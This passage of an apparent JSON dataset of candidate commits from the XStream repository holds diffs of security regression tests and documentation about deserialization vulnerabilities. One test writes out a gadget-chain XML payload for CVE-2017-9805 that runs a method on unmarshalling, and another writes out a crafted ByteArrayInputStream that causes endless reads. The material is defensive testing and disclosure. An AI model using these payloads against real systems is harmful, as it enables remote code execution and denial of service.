          "214:     public void testCannotInjectManipulatedByteArryInputStream() {",
          "215:         xstream.alias(\"bais\", ByteArrayInputStream.class);",
          "216:         System.out.println(Integer.MAX_VALUE);",
          "217:         final String xml = \"\"",
          "218:             + \"<bais>\\n\"",
          "219:             + \"  <buf></buf>\\n\"",
          "220:             + \"  <pos>-2147483648</pos>\\n\"",
          "221:             + \"  <mark>0</mark>\\n\"",
          "222:             + \"  <count>0</count>\\n\"",
          "223:             + \"</bais>\";",
          "225:         try {",
          "226:             xstream.fromXML(xml);",
          "227:             fail(\"Thrown \" + ForbiddenClassException.class.getName() + \" expected\");",
          "228:         } catch (final ForbiddenClassException e) {",
          "229:             assertEquals(e.getMessage(), ByteArrayInputStream.class.getName());",
          "230:         }",
          "231:     }",
          "233:     public void testExplicitlyUnmarshalEndlessByteArryInputStream() throws IOException {",
          "234:         xstream.alias(\"bais\", ByteArrayInputStream.class);",
          "235:         xstream.allowTypes(new Class[]{ByteArrayInputStream.class});",
          "237:         final String xml = \"\"",
          "238:             + \"<bais>\\n\"",
          "239:             + \"  <buf></buf>\\n\"",
          "240:             + \"  <pos>-2147483648</pos>\\n\"",
          "241:             + \"  <mark>0</mark>\\n\"",
          "242:             + \"  <count>0</count>\\n\"",
          "243:             + \"</bais>\";",
          "245:         final byte[] data = new byte[10];",
          "246:         try (final ByteArrayInputStream bais = (ByteArrayInputStream)xstream.fromXML(xml)) {",
          "247:             int i = 5;",
          "248:             while (bais.read(data, 0, 10) == 0) {",
          "249:                 if (--i == 0) {",
          "250:                     break;",
          "251:                 }",
          "252:             }",
          "253:             assertEquals(\"Unlimited reads of ByteArrayInputStream returning 0 bytes expected\", 0, i);",
          "254:         }",
          "255:     }",
          "",
          "---------------"
        ]
      }
    },
    {
      "candidate_hash": "2572d349fb4f5f3c3831e00686410a043aaa35d2",
      "candidate_info": {
        "commit_hash": "2572d349fb4f5f3c3831e00686410a043aaa35d2",
        "repo": "x-stream/xstream",
        "commit_url": "https://github.com/x-stream/xstream/commit/2572d349fb4f5f3c3831e00686410a043aaa35d2",
        "files": [
          "xstream-distribution/src/content/changes.html",
          "xstream/src/test/com/thoughtworks/acceptance/SecurityVulnerabilityTest.java"
        ],
        "message": "Fix for CVE-2017-9805.",
        "before_after_code_files": [
          "xstream-distribution/src/content/changes.html||xstream-distribution/src/content/changes.html",
          "xstream/src/test/com/thoughtworks/acceptance/SecurityVulnerabilityTest.java||xstream/src/test/com/thoughtworks/acceptance/SecurityVulnerabilityTest.java"
        ]
      },
      "candidate_patch_features": {
        "candidate_earlier_than_patch": 1,
        "same_branch_evolution": 1,
        "olp_code_files": {
          "patch": [
            "xstream-distribution/src/content/changes.html||xstream-distribution/src/content/changes.html"
          ],
          "candidate": [
            "xstream-distribution/src/content/changes.html||xstream-distribution/src/content/changes.html"
          ]
        }
      },
      "candidate_diff": {
        "xstream-distribution/src/content/changes.html||xstream-distribution/src/content/changes.html": [
          "File: xstream-distribution/src/content/changes.html -> xstream-distribution/src/content/changes.html",
          "--- Hunk 1 ---",
          "[Context before]",
          "97:   <li>No support for Hibernate 3 collections.</li>",
          "98:  </ul>",
          "100:  <h1 id=\"1.4.13\">1.4.13</h1>",
          "102:  <p>Released September 6, 2020.</p>",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "100:  <h1 id=\"upcoming-1.4.x\">Upcoming 1.4.x maintenance release</h1>",
          "102:  <p>Not yet released.</p>",
          "104:  <p class=\"highlight\">This maintenance release addresses the security vulnerability CVE-2017-9805 reported",
          "105:  originally for Struts' XStream Plugin, an arbitrary execution of commands when unmarshalling for XStream instances",
          "106:  with uninitialized security framework.</p>",
          "",
          "---------------"
        ],
        "xstream/src/test/com/thoughtworks/acceptance/SecurityVulnerabilityTest.java||xstream/src/test/com/thoughtworks/acceptance/SecurityVulnerabilityTest.java": [
          "File: xstream/src/test/com/thoughtworks/acceptance/SecurityVulnerabilityTest.java -> xstream/src/test/com/thoughtworks/acceptance/SecurityVulnerabilityTest.java",
          "--- Hunk 1 ---",
          "[Context before]",
          "11: package com.thoughtworks.acceptance;",
          "13: import java.beans.EventHandler;",
          "15: import com.thoughtworks.xstream.XStreamException;",
          "16: import com.thoughtworks.xstream.converters.ConversionException;",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "14: import java.util.Iterator;",
          "",
          "---------------",
          "--- Hunk 2 ---",
          "[Context before]",
          "76:         assertEquals(\"Executed!\", BUFFER.toString());",
          "77:     }",
          "79:     public static class Exec {",
          "81:         public void exec() {",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "80:     public void testExplicitlyConvertImageIOContainsFilter() {",
          "81:         final String xml = \"\"",
          "82:             + \"<string class='javax.imageio.spi.FilterIterator'>\\n\"",
          "83:             + \" <iter class='java.util.ArrayList$Itr'>\\n\"",
          "84:             + \"   <cursor>0</cursor>\\n\"",
          "85:             + \"   <lastRet>1</lastRet>\\n\"",
          "86:             + \"   <expectedModCount>1</expectedModCount>\\n\"",
          "87:             + \"   <outer-class>\\n\"",
          "88:             + \"     <com.thoughtworks.acceptance.SecurityVulnerabilityTest_-Exec/>\\n\"",
          "89:             + \"   </outer-class>\\n\"",
          "90:             + \" </iter>\\n\"",
          "91:             + \" <filter class='javax.imageio.ImageIO$ContainsFilter'>\\n\"",
          "92:             + \"   <method>\\n\"",
          "93:             + \"     <class>com.thoughtworks.acceptance.SecurityVulnerabilityTest$Exec</class>\\n\"",
          "94:             + \"     <name>exec</name>\\n\"",
          "95:             + \"     <parameter-types/>\\n\"",
          "96:             + \"   </method>\\n\"",
          "97:             + \"   <name>exec</name>\\n\"",
          "98:             + \" </filter>\\n\"",
          "99:             + \" <next/>\\n\"",
          "100:             + \"</string>\";",
          "102:         xstream.allowTypes(\"javax.imageio.ImageIO$ContainsFilter\");",
          "103:         xstream.allowTypeHierarchy(Iterator.class);",
          "105:         final Iterator<?> iterator = xstream.fromXML(xml);",
          "106:         assertEquals(0, BUFFER.length());",
          "107:         iterator.next();",
          "108:         assertEquals(\"Executed!\", BUFFER.toString());",
          "109:     }",
          "",
          "---------------"
        ]
      }
    },
    {
      "candidate_hash": "add7019a3d5d55a324f1eb1939d8884dc7d48a19",
      "candidate_info": {
        "commit_hash": "add7019a3d5d55a324f1eb1939d8884dc7d48a19",
        "repo": "x-stream/xstream",
        "commit_url": "https://github.com/x-stream/xstream/commit/add7019a3d5d55a324f1eb1939d8884dc7d48a19",
        "files": [
          "xstream-distribution/src/content/changes.html",
          "xstream-distribution/src/content/security.html",
          "xstream/src/java/com/thoughtworks/xstream/XStream.java"
        ],
        "message": "Merge documentation from 1.4.x branch.",
        "before_after_code_files": [
          "xstream-distribution/src/content/changes.html||xstream-distribution/src/content/changes.html",
          "xstream-distribution/src/content/security.html||xstream-distribution/src/content/security.html",
          "xstream/src/java/com/thoughtworks/xstream/XStream.java||xstream/src/java/com/thoughtworks/xstream/XStream.java"
        ]
      },
      "candidate_patch_features": {
        "candidate_earlier_than_patch": 0,
        "same_branch_evolution": 1,
        "olp_code_files": {
          "patch": [
            "xstream-distribution/src/content/changes.html||xstream-distribution/src/content/changes.html",
            "xstream-distribution/src/content/security.html||xstream-distribution/src/content/security.html"
          ],
          "candidate": [
            "xstream-distribution/src/content/changes.html||xstream-distribution/src/content/changes.html",
            "xstream-distribution/src/content/security.html||xstream-distribution/src/content/security.html"
          ]
        }
      },
      "candidate_diff": {
        "xstream-distribution/src/content/changes.html||xstream-distribution/src/content/changes.html": [
          "File: xstream-distribution/src/content/changes.html -> xstream-distribution/src/content/changes.html",
          "--- Hunk 1 ---",
          "[Context before]",
          "101:   <li>No support for Hibernate 3 collections.</li>",
          "102:  </ul>",
          "105:  <h1 id=\"upcoming-1.4.x\">Upcoming 1.4.x maintenance release</h1>",
          "107:  <p>Not yet released.</p>",
          "110:  <h1 id=\"1.4.17\">1.4.17</h1>",
          "",
          "[Removed Lines]",
          "104: <!--",
          "108: -->",
          "",
          "[Added Lines]",
          "108:  <h2>Stream compatibility</h2>",
          "110:  <p class=\"highlight\">Starting with version 1.14.12 nine years ago, XStream contains a",
          "111:  <a href=\"security.html#framework\">Security Framework</a> to implement a black- or whitelist for the allowed types",
          "112:  at deserialization time.  Until version 1.4.17, XStream kept a default blacklist in order to deny all types of the",
          "113:  Java runtime, which are used for all kinds of <a href=\"security.html#CVEs\">security attacks</a>, in order to",
          "114:  guarantee optimal runtime compatibility for existing users.  However, this approach has failed.  The last months",
          "115:  have shown, that the Java runtime alone contains dozens of types that can be used for an attack, not even looking",
          "116:  at the 3rd party libraries on a classpath.  The new version of XStream uses therefore now by default a whitelist,",
          "117:  which is recommended since nine years.  It also has been complaining on the console for a long time about an",
          "118:  uninitialized security framework the first time it was run.  Anyone who has followed the advice and initialized the",
          "119:  security framework for their own scenario can easily update to the new version without any problem. Everyone else",
          "120:  will have to do a proper initialization now, otherwise the new version will fail with certainty at deserialization",
          "121:  time.</p>",
          "",
          "---------------"
        ],
        "xstream-distribution/src/content/security.html||xstream-distribution/src/content/security.html": [
          "File: xstream-distribution/src/content/security.html -> xstream-distribution/src/content/security.html",
          "--- Hunk 1 ---",
          "[Context before]",
          "19:  constructor, call a method to convert an object into XML, then call another method to turn the XML back into an",
          "20:  equivalent Java object.  By design, there are few limits to the type of objects XStream can handle.</p>",
          "25:  <p>This flexibility comes at a price.  XStream applies various techniques under the hood to ensure it is able to",
          "26:   handle all types of objects.  This includes using undocumented Java features and reflection.  The XML generated by",
          "27:   XStream includes all information required to build objects of almost any type.  This introduces a potential",
          "",
          "[Removed Lines]",
          "22:  <p class=highlight>Note: XStream supports other data formats than XML, e.g. JSON. Those formats can be used for",
          "23:  the same attacks.</p>",
          "",
          "[Added Lines]",
          "[None]",
          "",
          "---------------",
          "--- Hunk 2 ---",
          "[Context before]",
          "32:  advantage of this to access private data, delete local files, execute arbitrary code or shell commands in the",
          "33:  context of the server running the XStream process or cause a denial of service by crashing the application or",
          "34:  manage to enter an endless loop consuming 100% of CPU cycles.</p>",
          "36:  <p>Note, that the XML data can be manipulated on different levels.  For example, manipulating values on existing",
          "37:   objects (such as a price value), accessing private data, or breaking the format and causing the XML parser to fail.",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "33:  <p class=highlight>Note: XStream supports other data formats than XML, e.g. JSON. Those formats can be used for",
          "34:  the same attacks.</p>",
          "",
          "---------------",
          "--- Hunk 3 ---",
          "[Context before]",
          "183:   <p>All those scenarios were based on types that are delivered with the Java runtime at some version.  Looking at",
          "184:   other well-known and commonly used Java libraries libraries such as ASM, CGLIB, or Groovy, you will have to assume",
          "185:   other scenarios for exploits as well.  A class like InvokerTransformer of Apache Commons Collections has a high",
          "187:   is also your responsibility to protect your clients from such vulnerabilities.</p>",
          "189:  <p>Note: This vulnerability is not even a special problem of XStream.  XML being deserialized by XStream acts here",
          "",
          "[Removed Lines]",
          "186:   potential for attacks.   By default XStream 1.5 works now with a whitelist.  If you modify the default setup, it",
          "",
          "[Added Lines]",
          "186:   potential for attacks.   By default XStream 1.4.18 works now with a whitelist.  If you modify the default setup, it",
          "",
          "---------------",
          "--- Hunk 4 ---",
          "[Context before]",
          "197:  <p class=\"hightlight\">A blacklist for special classes only creates therefore a scenario for a false security,",
          "198:     because no-one can assure, that no other vulnerability is found.  A better approach is the usage of a whitelist",
          "201:     <h2 id=\"explicit\">Explicit Security</h2>",
          "",
          "[Removed Lines]",
          "199:     i.e. the allowed class types are setup explicitly. This is the default for XStream 1.5.x (see below).</p>",
          "",
          "[Added Lines]",
          "199:     i.e. the allowed class types are setup explicitly. This is the default for XStream 1.4.18 (see below).</p>",
          "",
          "---------------",
          "--- Hunk 5 ---",
          "[Context before]",
          "205:  With these permissions it is at least not possible to inject unexpected types into an object graph.  The security",
          "206:  framework supports the setup of a blacklist or whitelist scenario.  Any application should use this feature to",
          "207:  limit the danger of arbitrary command execution if it deserializes data from an external source.</p>",
          "209:  <p>XStream itself sets up a whitelist by default, i.e. it blocks all classes except those types it has explicit",
          "213:  <p class=highlight>Note:  If a type on a whitelist contains itself other members that are handled by XStream, you",
          "214:  will have to add those member's types to the whitelist also.  There is no automatism for indirect references.</p>",
          "",
          "[Removed Lines]",
          "210:  converters for.  Nonetheless, it is still the better approach to maintain an own whitelist for an XStream",
          "211:  instance.  A blacklist scenario should be avoided in general, because it provides a false sense of security.</p>",
          "",
          "[Added Lines]",
          "210:  converters for. Until version 1.4.17 it used a blacklist by default, i.e. it tried to block all currently known",
          "211:  critical classes of the Java runtime.  Main reason for the blacklist were compatibility, it allowed to use newer",
          "212:  versions of XStream as drop-in replacement.  However, this approach has failed.  A growing list of security reports",
          "213:  has proven, that a blacklist is inherently unsafe, apart from the fact that types of 3rd libraries were not even",
          "214:  considered.  XStream provides the ability to setup a whitelist since version 1.4.7, a version released nine years",
          "215:  before 1.4.18.  Clients who have adapted their setup and initialize the security framework are able to use newer",
          "216:  versions again as drop-in replacement.  A blacklist scenario should be avoided in general, because it provides a",
          "217:  false sense of security.</p>",
          "",
          "---------------",
          "--- Hunk 6 ---",
          "[Context before]",
          "231:  <p>Noted above, it might be possible that other combinations are found with the Java runtime itself, or other",
          "232:  commonly-used Java libraries that allow a similar vulnerability like the known case using the Java Beans",
          "233:  EventHandler.  To prevent such a possibility at all, XStream version 1.4.7 and above contains a security framework,",
          "236:  <p>The core interface is <a href=\"javadoc/com/thoughtworks/xstream/security/TypePermission.html\">TypePermission</a>.",
          "237:  The <a href=\"javadoc/com/thoughtworks/xstream/mapper/SecurityMapper.html\">SecurityMapper</a> will evaluate a list",
          "238:  of registered instances for every type that will be required while unmarshalling input data.  The interface has one",
          "",
          "[Removed Lines]",
          "234:  allowing application developers to define which types are allowed to be unmarshalled with XStream.</p>",
          "",
          "[Added Lines]",
          "240:  allowing application developers to define which types are allowed to be unmarshalled with XStream.  Use",
          "241:  <a href=\"javadoc/com/thoughtworks/xstream/XStream.html#setupDefaultSecurity-com.thoughtworks.xstream.XStream-\">XStream.setupDefaultSecurity()</a>",
          "242:  to install the default whitelist of 1.4.18 already with 1.4.7 to 1.4.10.</p>",
          "",
          "---------------",
          "--- Hunk 7 ---",
          "[Context before]",
          "398:     <h2 id=\"workaround\">Workarounds for older XStream versions</h2>",
          "400:     <p>As recommended, use XStream's security framework to implement a whitelist for the allowed types. This is",
          "404: </pre></div>",
          "405:     <p>Users of XStream 1.4.16 who insist to use XStream default blacklist - despite that clear recommendation - can",
          "",
          "[Removed Lines]",
          "401:     possible since XStream 1.4.7 and the default since XStream 1.5.0:</p>",
          "402: <div class=\"Source Java\"><pre>XStream xstream = new XStream();",
          "",
          "[Added Lines]",
          "409:     possible since XStream 1.4.7 and the default since XStream 1.4.18:</p>",
          "410: <div class=\"Source Java\"><pre>XStream xstream= new XStream();",
          "411: XStream.setupDefaultSecurity(xstream);",
          "",
          "---------------"
        ],
        "xstream/src/java/com/thoughtworks/xstream/XStream.java||xstream/src/java/com/thoughtworks/xstream/XStream.java": [
          "File: xstream/src/java/com/thoughtworks/xstream/XStream.java -> xstream/src/java/com/thoughtworks/xstream/XStream.java"
        ]
      }
    }
  ]
}